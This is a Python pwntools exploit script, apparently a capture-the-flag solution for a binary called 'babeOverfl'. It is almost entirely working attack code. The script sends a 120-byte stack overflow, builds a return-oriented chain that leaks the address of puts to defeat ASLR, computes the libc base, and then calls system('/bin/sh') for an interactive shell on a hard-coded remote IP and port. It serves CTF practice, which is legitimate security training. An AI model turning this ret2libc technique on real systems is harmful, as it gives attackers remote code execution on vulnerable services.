from pwn import *

elf = context.binary = ELF('./babeOverfl')
libc = ELF('./libc.so.6')

host = args.HOST or '34.126.117.181'
port = int(args.PORT or 3333)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b func
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()
p.recvuntil('Input: \n')
p.sendline(str(4198817))

POP_RDI = p64(0x000000000040132b)
payload = 'A' * 120 + POP_RDI + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['func'])
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, '\x00'))
# puts: 0x7f5fd12a3a30, read: 0x7f152b2c3180 => libc6_2.27-3ubuntu1.2_amd64
# log.info('Leak: {}'.format(hex(leak)))
libc_base = leak - libc.sym['puts']
log.info('Libc Base: {}'.format(hex(libc_base)))

RET = p64(0x0000000000401016)
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()


payload = 'A' * 120 + RET + POP_RDI + p64(binsh) + p64(system)

p.sendline(payload)
p.interactive()
p.close()